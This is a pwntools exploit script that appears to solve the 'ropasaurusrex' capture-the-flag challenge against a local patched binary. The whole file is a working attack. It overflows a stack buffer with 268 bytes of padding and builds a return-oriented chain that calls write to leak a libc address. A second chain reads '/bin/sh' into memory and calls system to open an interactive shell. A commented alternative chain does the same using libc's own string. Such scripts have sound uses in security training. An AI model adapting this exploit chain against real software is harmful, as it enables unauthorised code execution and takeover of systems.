from pwn import *

context.arch = "amd64"

LIBC_PATH = "./downloads/libc-2.39.so"

LIBC = ELF(LIBC_PATH)

CHALL_PATH = "./ropasaurusrex_patched"

CHALL = ELF(CHALL_PATH)

COMMANDS = '''
c
'''

if args.REMOTE:
    pass
else:
    if args.GDB:
       r = gdb.debug(CHALL_PATH, gdbscript=COMMANDS)
    else:
        r = process(CHALL_PATH) 

#leak the LIBC base
payload = b"A"*268
payload += p32(CHALL.plt["write"])
payload += p32(CHALL.symbols["main"])
payload += p32(1)
payload += p32(CHALL.got["read"])
payload += p32(4)

r.recvuntil(b"Input: ")
r.sendline(payload)

libc_leak = r.recv(4)
LIBC.address = u32(libc_leak) - LIBC.symbols["read"]
print(f"libc_base: {hex(LIBC.address)}")

ADD_ESP_12 = 0X0804901B #address of rop gadget : add esp, 8; pop ebx; ret; 

payload = b"A"*268
payload += p32(LIBC.symbols["read"])
payload += p32(ADD_ESP_12)
payload += p32(0)
payload += p32(0x804c300)
payload += p32(7)

payload += p32(LIBC.symbols["system"])
payload += p32(0xdeadbeef)
payload += p32(0x804c300)

'''
or 
payload += b"A"*268
payload += p32(LIBC.symbols["system"])
payload += p32(ADD_ESP_12)
payload += p32(next(LIBC.search(b"/bin/sh\x00")))

and comment r.send(b"/bin/sh")

'''

r.recvuntil(b"Input: ")
r.sendline(payload)
r.send(b"/bin/sh")



r.interactive()